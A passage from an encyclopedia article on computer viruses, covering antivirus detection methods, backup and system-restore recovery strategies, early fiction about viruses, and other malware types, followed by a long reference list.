Microsoft Security Essentials
[
97
]
 (for Windows XP, Vista and Windows 7) for real-time protection, the 
Windows Malicious Software Removal Tool
[
98
]
 (now included with 
Windows (Security) Updates
 on "
Patch Tuesday
", the second Tuesday of each month), and 
Windows Defender
 (an optional download in the case of Windows XP).
[
99
]
 Additionally, several capable antivirus software programs are available for free download from the Internet (usually restricted to non-commercial use).
[
100
]
 Some such free programs are almost as good as commercial
competitors.
[
101
]
 Common 
security vulnerabilities
 are assigned 
CVE IDs
 and listed in the US 
National Vulnerability Database
. 
Secunia PSI
[
102
]
 is an example of software, free for personal use, that will check a PC for vulnerable out-of-date software, and attempt to update it. 
Ransomware
 and 
phishing
 
scam
 alerts appear as press releases on the 
Internet Crime Complaint Center noticeboard
. Ransomware is a virus that posts a message on the user's screen saying that the screen or system will remain locked or unusable until a 
ransom
 payment is made. 
Phishing
 is a deception in which the malicious individual pretends to be a friend, computer security expert, or other benevolent individual, with the goal of convincing the targeted individual to reveal 
passwords
 or other personal information.

Other commonly used preventive measures include timely operating system updates, software updates, careful Internet browsing (avoiding shady websites), and installation of only trusted software.
[
103
]
 Certain browsers flag sites that have been reported to Google and that have been confirmed as hosting malware by Google.
[
104
]
[
105
]


There are two common methods that an antivirus software application uses to detect viruses, as described in the 
antivirus software
 article. The first, and by far the most common method of virus detection is using a list of 
virus signature
 definitions. This works by examining the content of the computer's memory (its 
Random Access Memory
 (RAM), and 
boot sectors
) and the files stored on fixed or removable drives (hard drives, floppy drives, or USB flash drives), and comparing those files against a 
database
 of known virus "signatures". Virus signatures are just strings of code that are used to identify individual viruses; for each virus, the antivirus designer tries to choose a unique signature string that will not be found in a legitimate program. Different antivirus programs use different "signatures" to identify viruses. The disadvantage of this detection method is that users are only protected from viruses that are detected by signatures in their most recent virus definition update, and not protected from new viruses (see "
zero-day attack
").
[
106
]


A second method to find viruses is to use a 
heuristic
 
algorithm
 based on common virus behaviors. This method can detect new viruses for which antivirus security firms have yet to define a "signature", but it also gives rise to more 
false positives
 than using signatures. False positives can be disruptive, especially in a commercial environment, because it may lead to a company instructing staff not to use the company computer system until IT services have checked the system for viruses. This can slow down productivity for regular workers.



Recovery strategies and methods
[
edit
]


One may reduce the damage done by viruses by making regular 
backups
 of data (and the operating systems) on different media, that are either kept unconnected to the system (most of the time, as in a hard drive), 
read-only
 or not accessible for other reasons, such as using different 
file systems
. This way, if data is lost through a virus, one can start again using the backup (which will hopefully be recent).
[
107
]
 If a backup session on 
optical media
 like 
CD
 and 
DVD
 is closed, it becomes read-only and can no longer be affected by a virus (so long as a virus or infected file was not copied onto the 
CD
/
DVD
). Likewise, an operating system on a 
bootable
 CD can be used to start the computer if the installed operating systems become unusable. Backups on removable media must be carefully inspected before restoration. The Gammima virus, for example, propagates via removable 
flash drives
.
[
108
]
[
109
]


Many websites run by antivirus software companies provide free online virus scanning, with limited "cleaning" facilities (after all, the purpose of the websites is to sell antivirus products and services). Some websites—like 
Google
 subsidiary 
VirusTotal
.com—allow users to upload one or more suspicious files to be scanned and checked by one or more antivirus programs in one operation.
[
110
]
[
111
]
 Additionally, several capable antivirus software programs are available for free download from the Internet (usually restricted to non-commercial use).
[
112
]
 Microsoft offers an optional free antivirus utility called 
Microsoft Security Essentials
, a 
Windows Malicious Software Removal Tool
 that is updated as part of the regular Windows update regime, and an older optional anti-malware (malware removal) tool 
Windows Defender
 that has been upgraded to an antivirus product in Windows 8.

Some viruses disable 
System Restore
 and other important Windows tools such as 
Task Manager
 and 
CMD
. An example of a virus that does this is CiaDoor. Many such viruses can be removed by 
rebooting
 the computer, entering Windows "
safe mode
" with networking, and then using system tools or 
Microsoft Safety Scanner
.
[
113
]
 
System Restore
 on 
Windows Me
, 
Windows XP
, 
Windows Vista
 and 
Windows 7
 can restore the 
registry
 and critical system files to a previous checkpoint. Often a virus will cause a system to "hang" or "freeze", and a subsequent hard reboot will render a system restore point from the same day corrupted. Restore points from previous days should work, provided the virus is not designed to corrupt the restore files and does not exist in previous restore points.
[
114
]
[
115
]


Microsoft's 
System File Checker
 (improved in Windows 7 and later) can be used to check for, and repair, corrupted system files.
[
116
]
 Restoring an earlier "clean" (virus-free) copy of the entire partition from a 
cloned disk
, a 
disk image
, or a 
backup
 copy is one solution—restoring an earlier backup disk "image" is relatively simple to do, usually removes any malware, and may be faster than "disinfecting" the computer—or reinstalling and reconfiguring the operating system and programs from scratch, as described below, then restoring user preferences.
[
107
]
 Reinstalling the operating system is another approach to virus removal. It may be possible to recover copies of essential user data by booting from a 
live CD
, or connecting the hard drive to another computer and booting from the second computer's operating system, taking great care not to infect that computer by executing any infected programs on the original drive. The original hard drive can then be reformatted and the OS and all programs installed from original media. Once the system has been restored, precautions must be taken to avoid reinfection from any restored 
executable files
.
[
117
]




Popular culture
[
edit
]


The first known description of a self-reproducing program in fiction is in the 1970 short story 
The Scarred Man
 by 
Gregory Benford
 which describes a computer program called VIRUS which, when installed on a computer with 
telephone modem
 dialing capability, randomly dials phone numbers until it hits a modem that is answered by another computer, and then attempts to program the answering computer with its own program, so that the second computer will also begin dialing random numbers, in search of yet another computer to program. The program rapidly spreads exponentially through susceptible computers and can only be countered by a second program called VACCINE.
[
118
]
 His story was based on an actual computer virus written in 
FORTRAN
 that Benford had created and run on the 
lab
 computer in the 1960s, as a proof-of-concept, and which 
he told John Brunner about
 in 1970.
[
119
]


The idea was explored further in two 1972 novels, 
When HARLIE Was One
 by 
David Gerrold
 and 
The Terminal Man
 by 
Michael Crichton
, and became a major theme of the 1975 novel 
The Shockwave Rider
 by 
John Brunner
.
[
120
]


The 1973 
Michael Crichton
 
sci-fi
 film 
Westworld
 made an early mention of the concept of a computer virus, being a central plot theme that causes 
androids
 to run amok.
[
121
]
[
better source needed
]
 
Alan Oppenheimer
's character summarizes the problem by stating that "...there's a clear pattern here which suggests an analogy to an infectious disease process, spreading from one...area to the next." To which the replies are stated: "Perhaps there are superficial similarities to disease" and, "I must confess I find it difficult to believe in a disease of machinery."
[
122
]




Other malware
[
edit
]


Main article: 
Malware


The term "virus" is also misused by extension to refer to other types of 
malware
. "Malware" encompasses computer viruses along with many other forms of malicious software, such as 
computer "worms"
, 
ransomware
, 
spyware
, 
adware
, 
trojan horses
, 
keyloggers
, 
rootkits
, 
bootkits
, malicious 
Browser Helper Object
 (BHOs), and other malicious software. The majority of active malware threats are trojan horse programs or computer worms rather than computer viruses. The term computer virus, coined by 
Fred Cohen
 in 1985, is a misnomer.
[
123
]
 Viruses often perform some type of harmful activity on infected host computers, such as acquisition of 
hard disk
 space or 
central processing unit
 (CPU) time, accessing and stealing private information (e.g., 
credit card
 numbers, 
debit card
 numbers, phone numbers, names, email addresses, passwords, bank information, house addresses, etc.), corrupting data, displaying political, humorous or threatening messages on the user's screen, 
spamming
 their e-mail contacts, 
logging their keystrokes
, or even rendering the computer useless. However, not all viruses carry a destructive "
payload
" and attempt to hide themselves—the defining characteristic of viruses is that they are self-replicating computer programs that modify other software without user consent by injecting themselves into the said programs, similar to a biological virus which replicates within living cells.



See also
[
edit
]




Botnet


Comparison of computer viruses


Computer fraud and abuse act


Computer security


Crimeware


Core Wars


Cryptovirology


Keystroke logging


Malware


Source code virus


Spam (electronic)


Technical support scam


Trojan horse (computing)


Virus hoax


Windows 7 File Recovery


Windows Security and Maintenance


Zombie (computer science)


Notes
[
edit
]






^
 
This is analogous to how 
genetic diversity
 in a population decreases the chance of a single disease wiping out a population in 
biology
.






References
[
edit
]






^
 
"The Internet comes down with a virus"
. 
The New York Times
. August 6, 2014. 
Archived
 from the original on April 11, 2020
. Retrieved 
September 3,
 2020
.




^
 
Stallings, William (2012). 
Computer security : principles and practice
. Boston: Pearson. p. 182. 
ISBN
 
978-0-13-277506-9
.
"Worm vs. Virus: What's the Difference and Does It Matter?"
. 
Avast Academy
. Avast Software s.r.o. 
Archived
 from the original on 15 March 2021
. Retrieved 
9 March
 2021
.




^
 
Piqueira, Jose R.C.; de Vasconcelos, Adolfo A.; Gabriel, Carlos E.C.J.; Araujo, Vanessa O. (2008). 
"Dynamic models for computer viruses"
. 
Computers & Security
. 
27
 (7–8): 355–359. 
doi
:
10.1016/j.cose.2008.07.006
. 
ISSN
 
0167-4048
. 
Archived
 from the original on 2022-12-28
. Retrieved 
2022-10-30
.




^
 
Alan Solomon (2011-06-14). 
"All About Viruses"
. 
VX Heavens
. Archived from 
the original
 on 2012-01-17
. Retrieved 
2014-07-17
.
Aycock, John (2006). 
Computer Viruses and Malware
. Springer. p. 
14
. 
ISBN
 
978-0-387-30236-2
.




^
 
"Worm vs. Virus: What's the Difference and Does It Matter?"
. 
Avast Academy
. Avast Software s.r.o. 
Archived
 from the original on 15 March 2021
. Retrieved 
9 March
 2021
.




^
 
Yeo, Sang-Soo. (2012). 
Computer science and its applications : CSA 2012, Jeju, Korea, 22-25.11.2012
. Springer. p. 515. 
ISBN
 
978-94-007-5699-1
. 
OCLC
 
897634290
.




^
 
Yu, Wei; Zhang, Nan; Fu, Xinwen; Zhao, Wei (October 2010). "Self-Disciplinary Worms and Countermeasures: Modeling and Analysis". 
IEEE Transactions on Parallel and Distributed Systems
. 
21
 (10): 1501–1514. 
doi
:
10.1109/tpds.2009.161
. 
ISSN
 
1045-9219
. 
S2CID
 
2242419
.




^
 
Filiol, Eric (2005). 
Computer viruses: from theory to applications
. Springer. p. 
8
. 
ISBN
 
978-2-287-23939-7
.
Harley, David; et al. (2001). 
Viruses Revealed
. McGraw-Hill. p. 
6
. 
ISBN
 
0-07-222818-0
.
Ludwig, Mark A. (1996). 
The Little Black Book of Computer Viruses: Volume 1, The Basic Technologies
. American Eagle Publications. pp. 16–17. 
ISBN
 
0-929408-02-0
.
Aycock, John (2006). 
Computer Viruses and Malware
. Springer. p. 
27
. 
ISBN
 
978-0-387-30236-2
.




^
 
Bell, David J.; et al., eds. (2004). 
"Virus"
. 
Cyberculture: The Key Concepts
. Routledge. p. 
154
. 
ISBN
 
9780203647059
.




^ 
a
 
b
 
"Viruses that can cost you"
. Archived from 
the original
 on 2013-09-25.




^
 
Granneman, Scott. 
"Linux vs. Windows Viruses"
. 
The Register
. 
Archived
 from the original on September 7, 2015
. Retrieved 
September 4,
 2015
.




^
 
von Neumann, John (1966). 
"Theory of Self-Reproducing Automata"
 
(PDF)
. 
Essays on Cellular Automata
. University of Illinois Press: 66–87. 
Archived
 
(PDF)
 from the original on June 13, 2010
. Retrieved 
June 10,
 2010
.




^
 
Éric Filiol, 
Computer viruses: from theory to applications, Volume 1
 
Archived
 2017-01-14 at the 
Wayback Machine
, Birkhäuser, 2005, pp. 19–38 
ISBN
 
2-287-23939-1
.




^
 


Risak, Veith (1972), 
"Selbstreproduzierende Automaten mit minimaler Informationsübertragung"
, 
Zeitschrift für Maschinenbau und Elektrotechnik
, 
archived
 from the original on 2010-10-05




^
 


Kraus, Jürgen (February 1980), 
Selbstreproduktion bei Programmen
 
(PDF)
, archived from 
the original
 
(PDF)
 on 2015-07-14
, retrieved 
2015-05-08




^
 
"Virus list"
. Archived from 
the original
 on 2006-10-16
. Retrieved 
2008-02-07
.




^
 
Thomas Chen; Jean-Marc Robert (2004). 
"The Evolution of Viruses and Worms"
. Archived from 
the original
 on 2013-08-09
. Retrieved 
2009-02-16
.




^
 
Parikka, Jussi (2007). 
Digital Contagions: A Media Archaeology of Computer Viruses
. New York: Peter Lang. p. 50. 
ISBN
 
978-0-8204-8837-0
. 
Archived
 from the original on 2017-03-16.




^
 
"The Creeper Worm, the First Computer Virus"
. 
History of information
. 
Archived
 from the original on 28 May 2022
. Retrieved 
16 June
 2022
.
[
unreliable source?
]




^
 
Russell, Deborah; Gangemi, G.T. (1991). 
Computer Security Basics
. O'Reilly. p. 
86
. 
ISBN
 
0-937175-71-4
.




^ 
a
 
b
 
Anick Jesdanun (1 September 2007). 
"School prank starts 25 years of security woes"
. 
CNBC
. 
Archived
 from the original on 20 December 2014
. Retrieved 
April 12,
 2013
.




^
 
Cohen, Fred (1984), 
Computer Viruses – Theory and Experiments
, 
archived
 from the original on 2007-02-18




^
 
Cohen, Fred, 
An Undetectable Computer Virus
 
Archived
 2014-05-25 at the 
Wayback Machine
, 1987, IBM




^
 
Burger, Ralph, 1991. 
Computer Viruses and Data Protection
, pp. 19–20




^
 
Alan Solomon; Dmitry O Gryaznov (1995). 
Dr. Solomon's Virus Encyclopedia
. Aylesbury, Buckinghamshire, U.K.: S & S International PLC. 
ISBN
 
1-897661-00-2
.




^
 
Alan Solomon (2011-06-14). 
"All About Viruses"
. 
VX Heavens
. Archived from 
the original
 on 2012-01-17
. Retrieved 
2014-07-17
.




^
 
Gunn, J.B. (June 1984). "Use of virus functions to provide a virtual APL interpreter under user control". 
ACM SIGAPL APL Quote Quad Archive
. 
14
 (4). ACM New York, NY, USA: 163–168. 
doi
:
10.1145/384283.801093
. 
ISSN
 
0163-6006
.




^
 
"Boot sector virus repair"
. Antivirus.about.com. 2010-06-10. 
Archived
 from the original on 2011-01-12
. Retrieved 
2010-08-27
.




^
 
"Amjad Farooq Alvi Inventor of first PC Virus post by Zagham"
. YouTube. 
Archived
 from the original on 2013-07-06
. Retrieved 
2010-08-27
.




^
 
"winvir virus"
. 
Archived
 from the original on 8 August 2016
. Retrieved 
10 June
 2016
.




^
 
Grimes, Roger (2001). 
Malicious Mobile Code: Virus Protection for Windows
. O'Reilly. pp. 
99
–100. 
ISBN
 
9781565926820
.




^
 
"SCA virus"
. Virus Test Center, University of Hamburg. 1990-06-05. 
Archived
 from the original on 2012-02-08
. Retrieved 
2014-01-14
.




^
 
Ludwig, Mark (1998). 
The giant black book of computer viruses
. Show Low, Ariz: American Eagle. p. 
15
. 
ISBN
 
978-0-929408-23-1
.




^ 
a
 
b
 
c
 
d
 
e
 
f
 
Stallings, William (2012). 
Computer security : principles and practice
. Boston: Pearson. p. 183. 
ISBN
 
978-0-13-277506-9
.




^
 
Ludwig, Mark (1998). 
The giant black book of computer viruses
. Show Low, Ariz: American Eagle. p. 
292
. 
ISBN
 
978-0-929408-23-1
.




^
 
"Basic malware concepts"
 
(PDF)
. cs.colostate.edu. 
Archived
 
(PDF)
 from the original on 2016-05-09
. Retrieved 
2016-04-25
.




^
 
Gregory, Peter (2004). 
Computer viruses for dummies
. Hoboken, NJ: Wiley Pub. p. 210. 
ISBN
 
0-7645-7418-3
.




^
 
"Payload"
. 
encyclopedia.kaspersky.com
. 
Archived
 from the original on 2023-12-06
. Retrieved 
2022-06-26
.




^
 
"What is a malicious payload?"
. 
CloudFlare
. 
Archived
 from the original on 2023-09-30
. Retrieved 
2022-06-26
.




^
 
Szor, Peter (2005). 
The art of computer virus research and defense
. Upper Saddle River, NJ: Addison-Wesley. p. 43. 
ISBN
 
0-321-30454-3
.




^
 
Serazzi, Giuseppe; Zanero, Stefano (2004). 
"Computer Virus Propagation Models"
 
(PDF)
. In Calzarossa, Maria Carla; Gelenbe, Erol (eds.). 
Performance Tools and Applications to Networked Systems
. Lecture Notes in Computer Science. Vol. 2965. pp. 26–50. 
Archived
 
(PDF)
 from the original on 2013-08-18.




^
 
Avoine, Gildas (2007). 
Computer System Security: Basic Concepts and Solved Exercises
. EPFL Press / CRC Press. pp. 21–22. 
ISBN
 
9781420046205
. 
Archived
 from the original on 2017-03-16.




^
 
Brain, Marshall; Fenton, Wesley (April 2000). 
"How Computer Viruses Work"
. HowStuffWorks.com. 
Archived
 from the original on 29 June 2013
. Retrieved 
16 June
 2013
.




^
 
Polk, William T. (1995). 
Antivirus Tools and Techniques for Computer Systems
. William Andrew (Elsevier). p. 4. 
ISBN
 
9780815513643
. 
Archived
 from the original on 2017-03-16.
Salomon, David (2006). 
Foundations of Computer Security
. Springer. pp. 47–48. 
ISBN
 
9781846283413
. 
Archived
 from the original on 2017-03-16.
Grimes, Roger (2001). 
Malicious Mobile Code: Virus Protection for Windows
. O'Reilly. pp. 
37
–38. 
ISBN
 
9781565926820
.




^
 
Grimes, Roger (2001). 
"Macro Viruses"
. 
Malicious Mobile Code: Virus Protection for Windows
. O'Reilly. 
ISBN
 
9781565926820
.




^
 
Aycock, John (2006). 
Computer Viruses and Malware
. Springer. p. 89. 
ISBN
 
9780387341880
. 
Archived
 from the original on 2017-03-16.




^
 
"What is boot sector virus?"
. 
Archived
 from the original on 2015-11-18
. Retrieved 
2015-10-16
.




^
 
Skoudis, Edward (2004). 
"Infection mechanisms and targets"
. 
Malware: Fighting Malicious Code
. Prentice Hall Professional. pp. 37–38. 
ISBN
 
9780131014053
. 
Archived
 from the original on 2017-03-16.
Anonymous (2003). 
Maximum Security
. Sams Publishing. pp. 331–333. 
ISBN
 
9780672324598
. 
Archived
 from the original on 2014-07-06.




^
 
Mishra, Umakant (2012). 
"Detecting Boot Sector Viruses- Applying TRIZ to Improve Anti-Virus Programs"
. 
SSRN Electronic Journal
. 
doi
:
10.2139/ssrn.1981886
. 
ISSN
 
1556-5068
. 
S2CID
 
109103460
.




^
 
Dave Jones. 2001 (December 2001). "Building an e-mail virus detection system for your network. Linux J. 2001, 92, 2-".
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)
CS1 maint: numeric names: authors list (
link
)




^
 
Béla G. Lipták, ed. (2002). 
Instrument engineers' handbook
 (3rd ed.). Boca Raton: CRC Press. p. 874. 
ISBN
 
9781439863442
. Retrieved 
September 4,
 2015
.




^
 
"Computer Virus Strategies and Detection Methods"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 23 October 2013
. Retrieved 
2 September
 2008
.




^
 
"What is Rootkit – Definition and Explanation"
. 
www.kaspersky.com
. 2022-03-09
. Retrieved 
2022-06-26
.




^
 
Kephart, J.O.; White, S.R. (1993). "Measuring and modeling computer virus prevalence". 
Proceedings 1993 IEEE Computer Society Symposium on Research in Security and Privacy
. pp. 2–15. 
doi
:
10.1109/RISP.1993.287647
. 
ISBN
 
0-8186-3370-0
. 
S2CID
 
8436288
. 
Archived
 from the original on 2023-02-09
. Retrieved 
2023-10-13
.




^
 
Szor, Peter (2005). 
The Art of Computer Virus Research and Defense
. Boston: Addison-Wesley. p. 285. 
ISBN
 
0-321-30454-3
. 
Archived
 from the original on 2017-03-16.




^
 
Fox-Brewster, Thomas. 
"Netflix Is Dumping Anti-Virus, Presages Death Of An Industry"
. 
Forbes
. 
Archived
 from the original on September 6, 2015
. Retrieved 
September 4,
 2015
.




^
 
"How Anti-Virus Software Works"
. Stanford University. 
Archived
 from the original on July 7, 2015
. Retrieved 
September 4,
 2015
.




^
 
"www.sans.org"
. 
Archived
 from the original on 2016-04-25
. Retrieved 
2016-04-16
.




^
 
Jacobs, Stuart (2015-12-01). 
Engineering Information Security: The Application of Systems Engineering Concepts to Achieve Information Assurance
. John Wiley & Sons. 
ISBN
 
9781119104711
.




^
 
Bishop, Matt (2003). 
Computer Security: Art and Science
. Addison-Wesley Professional. p. 620. 
ISBN
 
9780201440997
. 
Archived
 from the original on 2017-03-16.




^ 
a
 
b
 
John Aycock (19 September 2006). 
Computer Viruses and Malware
. Springer. pp. 35–36. 
ISBN
 
978-0-387-34188-0
. 
Archived
 from the original on 16 March 2017.




^
 
"What is a polymorphic virus? - Definition from WhatIs.com"
. 
SearchSecurity
. 
Archived
 from the original on 2018-04-08
. Retrieved 
2018-08-07
.




^
 
Kizza, Joseph M. (2009). 
Guide to Computer Network Security
. Springer. p. 
341
. 
ISBN
 
9781848009165
.




^
 
Eilam, Eldad (2011). 
Reversing: Secrets of Reverse Engineering
. John Wiley & Sons. p. 216. 
ISBN
 
9781118079768
. 
Archived
 from the original on 2017-03-16.




^
 
"Virus Bulletin : Glossary – Polymorphic virus"
. Virusbtn.com. 2009-10-01. 
Archived
 from the original on 2010-10-01
. Retrieved 
2010-08-27
.




^
 
Perriot, Fredrick; Peter Ferrie; Peter Szor (May 2002). 
"Striking Similarities"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on September 27, 2007
. Retrieved 
September 9,
 2007
.




^
 
"Virus Bulletin : Glossary — Metamorphic virus"
. Virusbtn.com. 
Archived
 from the original on 2010-07-22
. Retrieved 
2010-08-27
.




^
 
Kaspersky, Eugene (November 21, 2005). 
"The contemporary antivirus industry and its problems"
. SecureLight. 
Archived
 from the original on October 5, 2013.




^
 
Norinder, Ludvig (2013-12-03). 
"Breeding power-viruses for ARM devices"
. 
Archived
 from the original on 2024-03-24
. Retrieved 
2024-03-24
.




^
 
Ganesan, Karthik; Jo, Jungho; Bircher, W. Lloyd; Kaseridis, Dimitris; Yu, Zhibin; John, Lizy K. (September 2010). 
"System-level max power (SYMPO)"
. 
Proceedings of the 19th international conference on Parallel architectures and compilation techniques - PACT '10
. p. 19. 
doi
:
10.1145/1854273.1854282
. 
ISBN
 
9781450301787
. 
S2CID
 
6995371
. Retrieved 
19 November
 2013
.




^
 
"Thermal Performance Challenges from Silicon to Systems"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2018-02-09
. Retrieved 
2021-08-29
.




^
 
"Virus Basics"
. US-CERT. 
Archived
 from the original on 2013-10-03.




^
 
"Virus Notice: Network Associates' AVERT Discovers First Virus That Can Infect JPEG Files, Assigns Low-Profiled Risk"
. Archived from 
the original
 on 2005-05-04
. Retrieved 
2002-06-13
.




^
 
"Users Really Do Plug in USB Drives They Find"
 
(PDF)
.




^
 
"Operating system market share"
. 
netmarketshare.com
. 
Archived
 from the original on 2015-05-12
. Retrieved 
2015-05-16
.




^
 
Mookhey, K.K.; et al. (2005). 
Linux: Security, Audit and Control Features
. ISACA. p. 128. 
ISBN
 
9781893209787
. 
Archived
 from the original on 2016-12-01.




^
 
Toxen, Bob (2003). 
Real World Linux Security: Intrusion Prevention, Detection, and Recovery
. Prentice Hall Professional. p. 365. 
ISBN
 
9780130464569
. 
Archived
 from the original on 2016-12-01.




^
 
Noyes, Katherine (Aug 3, 2010). 
"Why Linux Is More Secure Than Windows"
. 
PCWorld
. Archived from 
the original
 on 2013-09-01.




^
 
Raggi, Emilio; et al. (2011). 
Beginning Ubuntu Linux
. Apress. p. 148. 
ISBN
 
9781430236276
. 
Archived
 from the original on 2017-03-16.




^
 
"McAfee discovers first Linux virus"
 (Press release). McAfee, via Axel Boldt. 5 February 1997. 
Archived
 from the original on 17 December 2005.




^
 
Boldt, Axel (19 January 2000). 
"Bliss, a Linux 'virus'
"
. 
Archived
 from the original on 14 December 2005.




^
 
David Kim; Michael G. Solomon (17 November 2010). 
Fundamentals of Information Systems Security
. Jones & Bartlett Publishers. pp. 360–. 
ISBN
 
978-1-4496-7164-8
. 
Archived
 from the original on 16 March 2017.




^
 
"1980s – Kaspersky IT Encyclopedia"
. 
Archived
 from the original on 2021-04-18
. Retrieved 
2021-03-16
.




^
 
"What is a Computer Virus?"
. Actlab.utexas.edu. 1996-03-31. Archived from 
the original
 on 2010-05-27
. Retrieved 
2010-08-27
.




^
 
The Definitive Guide to Controlling Malware, Spyware, Phishing, and Spam
. Realtimepublishers.com. 1 January 2005. pp. 48–. 
ISBN
 
978-1-931491-44-0
. 
Archived
 from the original on 16 March 2017.




^
 
Eli B. Cohen (2011). 
Navigating Information Challenges
. Informing Science. pp. 27–. 
ISBN
 
978-1-932886-47-4
. 
Archived
 from the original on 2017-12-19.




^
 
Vesselin Bontchev. 
"Macro Virus Identification Problems"
. 
FRISK Software International
. Archived from 
the original
 on 2012-08-05.




^
 
"Facebook 'photo virus' spreads via email"
. 2012-07-19. 
Archived
 from the original on 2014-05-29
. Retrieved 
2014-04-28
.




^
 
Berend-Jan Wever. 
"XSS bug in hotmail login page"
. 
Archived
 from the original on 2014-07-04
. Retrieved 
2014-04-07
.




^
 
Wade Alcorn. 
"The Cross-site Scripting Virus"
. bindshell.net. Archived from 
the original
 on 2014-08-23
. Retrieved 
2015-10-13
.




^
 
Eugene H. Spafford; Kathleen A. Heaphy; David J. Ferbrache (1989). 
Dealing With Electronic Vandalism
. 
ADAPSO
 Software Industry Division.




^
 
"Ka-Boom: Anatomy of a Computer Virus". 
InformationWeek
. December 3, 1990. p. 60.




^
 
"Trove"
. 
trove.nla.gov.au
. 
Archived
 from the original on 2021-04-18
. Retrieved 
2020-09-03
.




^
 
Hovav, Anat (August 2005). 
"Capital market reaction to defective IT products"
. 
Computers and Security
. 
24
 (5): 409–424. 
doi
:
10.1016/j.cose.2005.02.003
.




^
 
"Detailed test reports—(Windows) home user"
. AV-Test.org. Archived from 
the original
 on 2013-04-07
. Retrieved 
2013-04-08
.




^
 
"Detailed test reports — Android mobile devices"
. AV-Test.org. 2019-10-22. 
Archived
 from the original on 2013-04-07.




^
 
"Microsoft Security Essentials"
. 
Archived
 from the original on June 21, 2012
. Retrieved 
June 21,
 2012
.




^
 
"Malicious Software Removal Tool"
. 
Microsoft
. Archived from 
the original
 on June 21, 2012
. Retrieved 
June 21,
 2012
.




^
 
"Windows Defender"
. 
Microsoft
. 
Archived
 from the original on June 22, 2012
. Retrieved 
June 21,
 2012
.




^
 
Rubenking, Neil J. (Feb 17, 2012). 
"The Best Free Antivirus for 2012"
. pcmag.com. 
Archived
 from the original on 2017-08-30.




^
 
Rubenking, Neil J. (Jan 10, 2013). 
"The Best Antivirus for 2013"
. pcmag.com. 
Archived
 from the original on 2016-04-25.




^
 
Rubenking, Neil J. 
"Secunia Personal Software Inspector 3.0 Review & Rating"
. 
PCMag.com
. 
Archived
 from the original on 2013-01-16
. Retrieved 
2013-01-19
.




^
 
"10 Step Guide to Protect Against Viruses"
. GrnLight.net. 
Archived
 from the original on 24 May 2014
. Retrieved 
23 May
 2014
.




^
 
"Google Safe Browsing"
. 
Archived
 from the original on 2014-09-14.




^
 
"Report malicious software (URL) to Google"
. 
Archived
 from the original on 2014-09-12.




^
 
Zhang, Yu; et al. (2008). 
"A Novel Immune Based Approach For Detection of Windows PE Virus"
. In Tang, Changjie; et al. (eds.). 
Advanced Data Mining and Applications: 4th International Conference, ADMA 2008, Chengdu, China, October 8-10, 2008, Proceedings
. Springer. p. 250. 
ISBN
 
9783540881919
. 
Archived
 from the original on 2017-03-16.




^ 
a
 
b
 
"Good Security Habits | US-CERT"
. 2 June 2009. 
Archived
 from the original on 2016-04-20
. Retrieved 
2016-04-16
.




^
 
"W32.Gammima.AG"
. Symantec. Archived from 
the original
 on 2014-07-13
. Retrieved 
2014-07-17
.




^
 
"Viruses! In! Space!"
. GrnLight.net. Archived from the original on 2014-05-24
. Retrieved 
2014-07-17
.
{{
cite web
}}
:  CS1 maint: unfit URL (
link
)




^
 
"VirusTotal.com (a subsidiary of Google)"
. 
Archived
 from the original on 2012-06-16.




^
 
"VirScan.org"
. 
Archived
 from the original on 2013-01-26.




^
 
Rubenking, Neil J. 
"The Best Free Antivirus for 2014"
. pcmag.com. 
Archived
 from the original on 2017-08-30.




^
 
"Microsoft Safety Scanner"
. 
Archived
 from the original on 2013-06-29.




^
 
"Virus removal -Help"
. 
Archived
 from the original on 2015-01-31
. Retrieved 
2015-01-31
.




^
 
"W32.Gammima.AG Removal — Removing Help"
. Symantec. 2007-08-27. Archived from 
the original
 on 2014-08-04
. Retrieved 
2014-07-17
.




^
 
"support.microsoft.com"
. 
Archived
 from the original on 2016-04-07
. Retrieved 
2016-04-16
.




^
 
"www.us-cert.gov"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2016-04-19
. Retrieved 
2016-04-16
.




^
 
Benford, Gregory (May 1970). "The Scarred Man". 
Venture Science Fiction
. Vol. 4, no. 2. pp. 122–.




^
 
November 1999
 "afterthoughts" to "The Scarred Man", Gregory Benford




^
 
Clute, John. 
"Brunner, John"
. 
The Encyclopedia of Science Fiction
. Orion Publishing Group. 
Archived
 from the original on 17 December 2018
. Retrieved 
30 January
 2013
.




^
 
IMDB synopsis of Westworld
. Retrieved November 28, 2015.




^
 
Michael Crichton (November 21, 1973). 
Westworld
 (film). 201 S. Kinney Road, Tucson, Arizona, USA: Metro-Goldwyn-Mayer.  Event occurs at 32 minutes. 
 And there's a clear pattern here which suggests an analogy to an infectious disease process, spreading from one resort area to the next." ... "Perhaps there are superficial similarities to disease." "I must confess I find it difficult to believe in a disease of machinery.
{{
cite AV media
}}
:  CS1 maint: location (
link
)




^
 
Ludwig, Mark (1998). 
The giant black book of computer viruses
. Show Low, Ariz: American Eagle. p. 
13
. 
ISBN
 
978-0-929408-23-1
.






Further reading
[
edit
]




Burger, Ralf (16 February 2010) [1991]. 
Computer Viruses and Data Protection
. Abacus. p. 353. 
ISBN
 
978-1-55755-123-8
.


Granneman, Scott (6 October 2003). 
"Linux vs. Windows Viruses"
. 
The Register
. 
Archived
 from the original on 7 September 2015
. Retrieved 
10 August
 2017
.


Ludwig, Mark (1993). 
Computer Viruses, Artificial Life and Evolution
. Tucson, Arizona 85717: American Eagle Publications, Inc. 
ISBN
 
0-929408-07-1
. Archived from 
the original
 on July 4, 2008.
{{
cite book
}}
:  CS1 maint: location (
link
)


Mark Russinovich
 (November 2006). 
Advanced Malware Cleaning 
video
 (Web (
WMV
 / 
MP4
)). Microsoft Corporation. 
Archived
 from the original on 4 September 2016
. Retrieved 
24 July
 2011
.


Parikka, Jussi
 (2007). 
Digital Contagions. A Media Archaeology of Computer Viruses
. Digital Formations. New York: Peter Lang. 
ISBN
 
978-0-8204-8837-0
.




External links
[
edit
]








Wikimedia Commons has media related to 
Computer viruses
.




‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Viruses
 at 
Curlie
 (DMOZ)


Microsoft Security Portal


US Govt CERT (Computer Emergency Readiness Team) site


'Computer Viruses – Theory and Experiments'
 – The original paper by Fred Cohen, 1984


Hacking Away at the Counterculture
 by 
Andrew Ross
  (On hacking, 1990)


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


